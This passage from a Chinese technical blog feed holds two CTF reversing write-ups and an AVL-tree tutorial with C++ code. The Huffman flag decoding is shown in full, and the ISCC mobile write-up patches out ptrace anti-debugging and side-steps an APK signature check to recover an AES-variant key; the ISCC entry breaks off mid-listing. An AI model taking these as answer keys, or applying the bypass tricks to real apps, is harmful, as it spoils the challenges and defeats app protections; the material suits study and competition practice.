class="hljs-number">0x58</span>)<br>    huffmanCode = decode_stl_str(pStr).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    print(<span class="hljs-built_in">chr</span>(nodeVal), huffmanCode)<br>    reverseMap[huffmanCode] = <span class="hljs-built_in">chr</span>(nodeVal)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br></code></pre></td></tr></table></figure><p>当所有的键值队都记录之后，print(reverseMap) 就可以得到对应关系, 我得到的数据如下</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">huffman = &#123;&#x27;<span class="hljs-number">00000000</span>&#x27;: &#x27;T&#x27;, &#x27;<span class="hljs-number">00000001</span>&#x27;: &#x27;6&#x27;, &#x27;<span class="hljs-number">000000</span>1&#x27;: &#x27;1&#x27;, &#x27;<span class="hljs-number">0000010000</span>&#x27;: &#x27;L&#x27;, &#x27;<span class="hljs-number">0000010001</span>&#x27;: &#x27;R&#x27;, &#x27;<span class="hljs-number">0000010010</span>&#x27;: &#x27;&#125;&#x27;, &#x27;<span class="hljs-number">0000010011</span>&#x27;: &#x27;M&#x27;, &#x27;<span class="hljs-number">0000010100</span>&#x27;: &#x27;;&#x27;, &#x27;<span class="hljs-number">0000010101</span>&#x27;: &#x27;C&#x27;, &#x27;<span class="hljs-number">0000010110</span>&#x27;: &#x27;&#123;&#x27;, &#x27;<span class="hljs-number">0000010111</span>&#x27;: &#x27;x&#x27;, &#x27;<span class="hljs-number">0000011000</span>&#x27;: &#x27;F&#x27;, &#x27;<span class="hljs-number">0000011001</span>&#x27;: &#x27;J&#x27;, &#x27;<span class="hljs-number">0000011010</span>&#x27;: &#x27;q&#x27;, &#x27;<span class="hljs-number">0000011011</span>&#x27;: &#x27;9&#x27;, &#x27;<span class="hljs-number">00000111</span>0&#x27;: &#x27;G&#x27;, &#x27;<span class="hljs-number">00000111</span>1&#x27;: &#x27;4&#x27;, &#x27;<span class="hljs-number">00001000</span>0&#x27;: &#x27;2&#x27;, &#x27;<span class="hljs-number">00001000</span>1&#x27;: <span class="hljs-string">&quot;&#x27;&quot;</span>, &#x27;<span class="hljs-number">00001001</span>0&#x27;: &#x27;7&#x27;, &#x27;<span class="hljs-number">00001001</span>1&#x27;: &#x27;W&#x27;, &#x27;<span class="hljs-number">000010</span>1&#x27;: &#x27;-&#x27;, &#x27;<span class="hljs-number">00001100</span>&#x27;: &#x27;k&#x27;, &#x27;<span class="hljs-number">00001101</span>&#x27;: &#x27;3&#x27;, &#x27;<span class="hljs-number">000011</span>1&#x27;: &#x27;b&#x27;, &#x27;<span class="hljs-number">0001</span>&#x27;: &#x27;i&#x27;, &#x27;001&#x27;: &#x27;e&#x27;, &#x27;<span class="hljs-number">0100</span>&#x27;: &#x27;n&#x27;, &#x27;<span class="hljs-number">0101</span>0&#x27;: &#x27;f&#x27;, &#x27;<span class="hljs-number">010110</span>&#x27;: &#x27;y&#x27;, &#x27;<span class="hljs-number">010111</span>&#x27;: &#x27;u&#x27;, &#x27;<span class="hljs-number">0110</span>&#x27;: &#x27;o&#x27;, &#x27;<span class="hljs-number">0111</span>&#x27;: &#x27;r&#x27;, &#x27;<span class="hljs-number">1000</span>0&#x27;: &#x27;l&#x27;, &#x27;<span class="hljs-number">100010</span>0&#x27;: &#x27;S&#x27;, &#x27;<span class="hljs-number">100010</span>1&#x27;: &#x27;v&#x27;, &#x27;<span class="hljs-number">100011</span>&#x27;: &#x27;g&#x27;, &#x27;<span class="hljs-number">1001</span>0&#x27;: &#x27;d&#x27;, &#x27;<span class="hljs-number">100110</span>0&#x27;: &#x27;H&#x27;, &#x27;<span class="hljs-number">100110</span>1&#x27;: &#x27;p&#x27;, &#x27;<span class="hljs-number">10011100</span>&#x27;: &#x27;A&#x27;, &#x27;<span class="hljs-number">10011101</span>0&#x27;: &#x27;8&#x27;, &#x27;<span class="hljs-number">10011101</span>1&#x27;: &#x27;\r&#x27;, &#x27;<span class="hljs-number">10011110</span>0&#x27;: &#x27;5&#x27;, &#x27;<span class="hljs-number">1001111010</span>&#x27;: &#x27;:&#x27;, &#x27;<span class="hljs-number">1001111011</span>0&#x27;: &#x27;(&#x27;, &#x27;<span class="hljs-number">1001111011</span>1&#x27;: &#x27;)&#x27;, &#x27;<span class="hljs-number">10011111</span>0&#x27;: &#x27;\n&#x27;, &#x27;<span class="hljs-number">10011111</span>1&#x27;: &#x27;B&#x27;, &#x27;<span class="hljs-number">1010</span>&#x27;: &#x27;t&#x27;, &#x27;<span class="hljs-number">101100</span>&#x27;: &#x27;w&#x27;, &#x27;<span class="hljs-number">101101</span>&#x27;: &#x27;m&#x27;, &#x27;<span class="hljs-number">101110</span>0&#x27;: &#x27;,&#x27;, &#x27;<span class="hljs-number">101110</span>1&#x27;: &#x27;.&#x27;, &#x27;<span class="hljs-number">101111</span>&#x27;: &#x27;c&#x27;, &#x27;<span class="hljs-number">1100</span>&#x27;: &#x27;a&#x27;, &#x27;<span class="hljs-number">1101</span>0&#x27;: &#x27;h&#x27;, &#x27;<span class="hljs-number">1101</span>1&#x27;: &#x27;s&#x27;, &#x27;111&#x27;: &#x27; &#x27;&#125;<br></code></pre></td></tr></table></figure><h2 id="二叉树数据结构"><a href="#二叉树数据结构" class="headerlink" title="二叉树数据结构"></a>二叉树数据结构</h2><ol><li>叶结点</li></ol><p>叶结点才是带数据的结点</p><img src="/2021/05/28/Redhat-filestore/image-20210528024828578.png" class="" title="image-20210528024828578"><ol start="2"><li>非叶子节点</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528025054776.png" class="" title="image-20210528025054776"><p>这两种结构的第二个 dd 的数据可以用来区分叶节点或者非叶子节点，区分值 0FFFFFFFF</p><p>叶子节点和非叶子节点的数据类型结构不一样，但是却通过非叶子节点中同一个指针字段指向，很少见。</p><h2 id="后续小细节"><a href="#后续小细节" class="headerlink" title="后续小细节"></a>后续小细节</h2><ol><li>01 字符串转字节流  40878C</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528025352961.png" class="" title="image-20210528025352961"><p>下断点观察数据即可</p><ol start="2"><li>最后一步输出还有一个加密算法</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528025426509.png" class="" title="image-20210528025426509"><p>这是一种类似rc4 带入密文即可得到明文的加密算法, 动态调试修改数据即可解密。</p><ol start="3"><li>解压过程</li></ol><p>我直接暴力匹配 01串前缀，匹配成功的则删除待解压数据的前缀，最终删除所有待解压数据，得到已经解压的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-built_in">bytearray</span>(data)<br>s = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    s += <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfille(<span class="hljs-number">8</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> s != <span class="hljs-string">&#x27;&#x27;</span>:<br>    <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> huffman:<br>        <span class="hljs-keyword">if</span> s.startswith(prefix):<br>            flag += huffman[prefix]<br>            s = s[<span class="hljs-built_in">len</span>(prefix): ]<br></code></pre></td></tr></table></figure><p>最后得到 flag</p><img src="/2021/05/28/Redhat-filestore/image-20210528025802761.png" class="" title="image-20210528025802761">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Huffman</tag>
      
      <tag>STL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AVL Tree</title>
    <link href="/2021/05/26/AVL-Tree/"/>
    <url>/2021/05/26/AVL-Tree/</url>
    
    <content type="html"><![CDATA[<h1 id="AVL-平衡二叉树"><a href="#AVL-平衡二叉树" class="headerlink" title="AVL 平衡二叉树"></a>AVL 平衡二叉树</h1><p>AVL 平衡二叉树在 BST 的基础上要求左右两子树的高度差不超过 1</p><p>插入新的元素可能影响树的平衡性，为了使插入元素后的树继续满足 AVL 性质，要对树进行一些调整。</p><p>插入新的元素后，有四种情况，分别为 <code>LL</code>, <code>LR</code>,<code>RR</code>,<code>RL</code></p><p>调整的方法是对最小不满足AVL性质的子树进行旋转操作。</p><p>左旋和右旋</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">T1, T2 <span class="hljs-keyword">and</span> T3 are subtrees <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> tree <br>rooted <span class="hljs-keyword">with</span> y (<span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">left</span> <span class="hljs-title">side</span>) <span class="hljs-title">or</span> <span class="hljs-title">x</span> (<span class="hljs-title">on</span> <br><span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> side)           <br>     y                               x<br>    / \     Right Rotation          /  \<br>   x   T3   - - - - - - - &gt;        T1   y <br>  / \       &lt; - - - - - - -            / \<br> T1  T2     Left Rotation            T2  T3<br>Keys <span class="hljs-keyword">in</span> both <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> above trees follow <span class="hljs-keyword">the</span> <br>following order <br> <span class="hljs-built_in">keys</span>(T1) &lt; key(x) &lt; <span class="hljs-built_in">keys</span>(T2) &lt; key(y) &lt; <span class="hljs-built_in">keys</span>(T3)<br>So BST property is <span class="hljs-keyword">not</span> violated anywhere.<br></code></pre></td></tr></table></figure><p>左旋和右旋操作后，子树仍然满足 BST 的性质，但是某些情况下可以降低子树的高度。</p><p>插入新的元素后，找到最小不满足 AVL 性质的子树，有以下四种情况（左侧） </p><p>主要关注 Z, Y, X</p><ol><li><strong>Left Left Case</strong>  (LL)</li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">T1, T2, T3 <span class="hljs-keyword">and</span> T4 are subtrees.<br>         z                                      y <br>        / <span class="hljs-string">\</span>                                   /   <span class="hljs-string">\</span><br>       y   T4      Right Rotate (z)          x      z<br>      / <span class="hljs-string">\</span>          - - - - - - - - -&gt;      /  <span class="hljs-string">\</span>    /  <span class="hljs-string">\</span> <br>     x   T3                               T1  T2  T3  T4<br>    / <span class="hljs-string">\</span><br>  T1   T2<br></code></pre></td></tr></table></figure><p>具体例子</p><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153058326.png" class="" title="image-20210526153058326"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526152831752.png" class="" title="image-20210526152831752"></th></tr></thead></table><ol start="2"><li><strong>Left Right Case</strong> (LR)</li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">     z                               z                           x<br>    / <span class="hljs-string">\</span>                            /   <span class="hljs-string">\</span>                        /  <span class="hljs-string">\</span> <br>   y   T4  Left Rotate (y)        x    T4  Right Rotate(z)    y      z<br>  / <span class="hljs-string">\</span>      - - - - - - - - -&gt;    /  <span class="hljs-string">\</span>      - - - - - - - -&gt;  / <span class="hljs-string">\</span>    / <span class="hljs-string">\</span><br>T1   x                          y    T3                    T1  T2 T3  T4<br>    / <span class="hljs-string">\</span>                        / <span class="hljs-string">\</span><br>  T2   T3                    T1   T2<br></code></pre></td></tr></table></figure><p>具体例子</p><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153159164.png" class="" title="image-20210526153159164"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526153213414.png" class="" title="image-20210526153213414"></th></tr></thead></table><ol start="3"><li><strong>Right Right Case</strong> (RR)</li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">  z                                y<br> /  <span class="hljs-string">\</span>                            /   <span class="hljs-string">\</span> <br>T1   y     Left Rotate(z)       z      x<br>    /  <span class="hljs-string">\</span>   - - - - - - - -&gt;    / <span class="hljs-string">\</span>    / <span class="hljs-string">\</span><br>   T2   x                     T1  T2 T3  T4<br>       / <span class="hljs-string">\</span><br>     T3  T4<br></code></pre></td></tr></table></figure><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153446889.png" class="" title="image-20210526153446889"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526153454332.png" class="" title="image-20210526153454332"></th></tr></thead></table><ol start="4"><li><strong>Right Left Case</strong></li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">   z                            z                            x<br>  / <span class="hljs-string">\</span>                          / <span class="hljs-string">\</span>                          /  <span class="hljs-string">\</span> <br>T1   y   Right Rotate (y)    T1   x      Left Rotate(z)   z      y<br>    / <span class="hljs-string">\</span>  - - - - - - - - -&gt;     /  <span class="hljs-string">\</span>   - - - - - - - -&gt;  / <span class="hljs-string">\</span>    / <span class="hljs-string">\</span><br>   x   T4                      T2   y                  T1  T2  T3  T4<br>  / <span class="hljs-string">\</span>                              /  <span class="hljs-string">\</span><br>T2   T3                           T3   T4<br></code></pre></td></tr></table></figure><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153542945.png" class="" title="image-20210526153542945"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526153550750.png" class="" title="image-20210526153550750"></th></tr></thead></table><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>leetcode 题</p><p><a href="https://leetcode-cn.com/problems/balance-a-binary-search-tree/">https://leetcode-cn.com/problems/balance-a-binary-search-tree/</a></p><p>非递归版本….xjb 手写能过 leetcode</p><p>插入过程:</p><p>遍历找插入位置 -&gt; 插入 -&gt; 更新高度 -&gt; 发现左右子树高度差大于 2 -&gt; 判断旋转类型 -&gt; 旋转</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, key);<br>      AVLTreeNode * new_node = _alloca_node();<br>      new_node-&gt;key = key;<br>      new_node-&gt;height = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> ( root == <span class="hljs-literal">nullptr</span>) &#123;<br>          root = new_node;<br>          <span class="hljs-keyword">return</span>;<br>      &#125;<br><br>      <span class="hljs-comment">// 找到一个合适的插入位置</span><br>      AVLTreeNode * insert_node = root;<br>      <span class="hljs-keyword">while</span> ( (key &lt;= insert_node-&gt;key &amp;&amp; insert_node-&gt;left) || (key &gt; insert_node-&gt;key &amp;&amp; insert_node-&gt;right) ) &#123;<br>          insert_node = key&lt;=insert_node-&gt;key?insert_node-&gt;left:insert_node-&gt;right;<br>      &#125;<br><br>      <span class="hljs-comment">// 插入到找到的位置.</span><br>      new_node-&gt;parent = insert_node;<br>      <span class="hljs-keyword">if</span> ( key &lt;= insert_node-&gt;key )<br>          insert_node-&gt;left = new_node;<br>      <span class="hljs-keyword">else</span><br>          insert_node-&gt;right = new_node;<br><br>      <span class="hljs-comment">// 更新高度</span><br>      AVLTreeNode * travel = new_node-&gt;parent;<br>      AVLTreeNode * lastBugTree = <span class="hljs-literal">nullptr</span>;<br>      <span class="hljs-keyword">int</span> balance;<br>      <span class="hljs-keyword">while</span> (travel) &#123;<br>          <span class="hljs-keyword">int</span> height_r, height_l;<br>          height_l = travel-&gt;left ? travel-&gt;left-&gt;height : <span class="hljs-number">0</span>;<br>          height_r = travel-&gt;right ? travel-&gt;right-&gt;height : <span class="hljs-number">0</span>;<br>          travel-&gt;height = max(height_l, height_r) + <span class="hljs-number">1</span>;<br>          balance = height_l - height_r;<br>          <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(balance) &gt; <span class="hljs-number">1</span>) &#123;<br>              lastBugTree = travel;<br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>          travel = travel-&gt;parent;<br>      &#125;<br><br>      <span class="hljs-comment">// 旋转</span><br>      AVLTreeNode * new_root;<br>      <span class="hljs-keyword">if</span> (lastBugTree) &#123;<br>          AVLTreeNode * lastBugParent;<br>          lastBugParent = lastBugTree-&gt;parent;<br>          <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; new_node-&gt;key &lt; lastBugTree-&gt;left-&gt;key) &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type1\n&quot;</span>);<br>              new_root = right_rotate(lastBugTree);<br>          &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; new_node-&gt;key &gt; lastBugTree-&gt;left-&gt;key)&#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type2\n&quot;</span>);<br>              new_root = left_right_rotate(lastBugTree);<br>          &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">0</span> &amp;&amp; new_node-&gt;key &gt; lastBugTree-&gt;right-&gt;key) &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;type3\n&quot;</span>);<br>              new_root = left_rotate(lastBugTree);<br>          &#125; <span class="hljs-keyword">else</span>  <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">0</span> &amp;&amp; new_node-&gt;key &lt; lastBugTree-&gt;right-&gt;key) &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type4\n&quot;</span>);<br>              new_root = right_left_rotate(lastBugTree);<br>          &#125;<br><br>          <span class="hljs-keyword">if</span> (!lastBugParent) &#123;<br>              root = new_root;<br>          &#125;<span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-keyword">if</span> (lastBugParent-&gt;key &gt; lastBugTree-&gt;key)<br>                  lastBugParent-&gt;left = new_root;<br>              <span class="hljs-keyword">else</span><br>                  lastBugParent-&gt;right = new_root;<br>          &#125;;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>旋转相关的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">AVLTreeNode * <span class="hljs-title">right_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;left;<br>    AVLTreeNode * x = y-&gt;left;<br><br>    y-&gt;parent  = z-&gt;parent;<br>    z-&gt;left = y-&gt;right;<br>    <span class="hljs-keyword">if</span> (z-&gt;left) z-&gt;left-&gt;parent = z;<br>    y-&gt;right = z;<br>    z-&gt;parent = y;<br>    <span class="hljs-comment">// 更新高度</span><br>    z-&gt;height = get_height(z) + <span class="hljs-number">1</span>;<br>    y-&gt;height = get_height(y) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-function">AVLTreeNode * <span class="hljs-title">left_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;right;<br>    AVLTreeNode * x = y-&gt;right;<br><br>    z-&gt;right = y-&gt;left;<br><br>    <span class="hljs-keyword">if</span> (z-&gt;right)<br>        z-&gt;right-&gt;parent = z;<br>    y-&gt;parent = z-&gt;parent;<br>    z-&gt;parent = y;<br>    y-&gt;left = z;<br>    <span class="hljs-comment">// 更新高度</span><br>    z-&gt;height = get_height(z) + <span class="hljs-number">1</span>;<br>    y-&gt;height = get_height(y) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-function">AVLTreeNode * <span class="hljs-title">left_right_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;left;<br>    AVLTreeNode * x = y-&gt;right;<br>    z-&gt;left = left_rotate(y);<br>    <span class="hljs-keyword">return</span> right_rotate(z);<br>&#125;<br><br><br><span class="hljs-function">AVLTreeNode * <span class="hljs-title">right_left_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;right;<br>    AVLTreeNode * x = y-&gt;left;<br>    z-&gt;right = right_rotate(y);<br>    <span class="hljs-keyword">return</span> left_rotate(z);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] AVL 数据可视化 <a href="https://www.cs.usfca.edu/~galles/visualization/AVLtree.html">https://www.cs.usfca.edu/~galles/visualization/AVLtree.html</a><br>[2] AVL Tree | Set 1 (Insertion) <a href="https://www.geeksforgeeks.org/avl-tree-set-1-insertion/">https://www.geeksforgeeks.org/avl-tree-set-1-insertion/</a><br>[3] Data Structure and Algorithms - AVL Trees <a href="https://www.tutorialspoint.com/data_structures_algorithms/avl_tree_algorithm.htm">https://www.tutorialspoint.com/data_structures_algorithms/avl_tree_algorithm.htm</a></p><p>[4] leetcode 1382. 将二叉搜索树变平衡 <a href="https://leetcode-cn.com/problems/balance-a-binary-search-tree/">https://leetcode-cn.com/problems/balance-a-binary-search-tree/</a></p>]]></content>
    
    
    <categories>
      
      <category>DataStruct</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AVL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC-mobile AES</title>
    <link href="/2021/05/25/ISCC-mobile-AES/"/>
    <url>/2021/05/25/ISCC-mobile-AES/</url>
    
    <content type="html"><![CDATA[<h1 id="ISCC2021-mobile"><a href="#ISCC2021-mobile" class="headerlink" title="ISCC2021 mobile"></a>ISCC2021 mobile</h1><p>题目下载:  <a href="/2021/05/25/ISCC-mobile-AES/iscc-aes.apk" title="iscc-aes.apk">iscc-aes.apk</a></p><p>这是一道 apk 逆向，核心函数位于 SO 库中并且在 JNI_OnLoad 中动态绑定函数。</p><ol><li><p>反调试</p><p> JNI_OnLoad 中有 ptrace 反调试，patch 掉即可</p></li><li><p>签名验证</p><p> 这道题的密钥由 apk 签名数据决定，因此要获取原始密钥，必须保证 apk 没有更改。但是为了反反调试，必须 patch so 文件。</p><p> 这里可以采取直接将修改的 so 文件 push 到 apk 安装后的目录中，这样并不会改变 apk 本身的签名。</p></li><li><p>核心算法是 AES 变种 + CBC 模式</p></li></ol><p>要解密如下字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">j9lXGz</span>/eWs<span class="hljs-number">4</span>iODrHgTbQZdtXl<span class="hljs-number">1</span>RjO<span class="hljs-number">82</span>FQhSADajx<span class="hljs-number">1</span>vRNnw<span class="hljs-number">2</span>NIASP/<span class="hljs-number">2</span>mySb<span class="hljs-number">2</span>Dqmgh<br></code></pre></td></tr></table></figure><h2 id="AES-变种"><a href="#AES-变种" class="headerlink" title="AES 变种"></a>AES 变种</h2><ol><li>修改了 <code>行移位</code>为 <code>列移位</code></li></ol><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入数据<br>df db 5d b9 <br>41 9b b8<span class="hljs-number"> 44 </span><br>f6<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 74 </span><br>74<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 95 </span><br><br>shift 本题计算结果:<br>DF<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 44 </span><br>41 DB<span class="hljs-number"> 74 </span>74<br>F6 9B 5D 95<br>74<span class="hljs-number"> 74 </span>B8 B9<br><br>shift 标准计算结果:<br>df db 5d b9 <br>9b b8<span class="hljs-number"> 44 </span>41 <br>74<span class="hljs-number"> 74 </span>f6<span class="hljs-number"> 74 </span><br>95<span class="hljs-number"> 74 </span>74<span class="hljs-number"> 74 </span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>修改了<code>列混合</code>的行为</p><p> 该题列混淆时，先将矩阵转置，再列混淆，最后再转置</p></li><li><p>修改了 <code>子密钥</code>计算过程</p><p> 具体怎么计算的没有细看，直接复制它计算好的数据即可, 但是要保证是没有被检测到反调试的数据</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> subkeys[<span class="hljs-number">11</span>][<span class="hljs-number">16</span>]  = &#123;<br>    <span class="hljs-number">0x31</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>,<br>    <span class="hljs-number">0x03</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x61</span>, <span 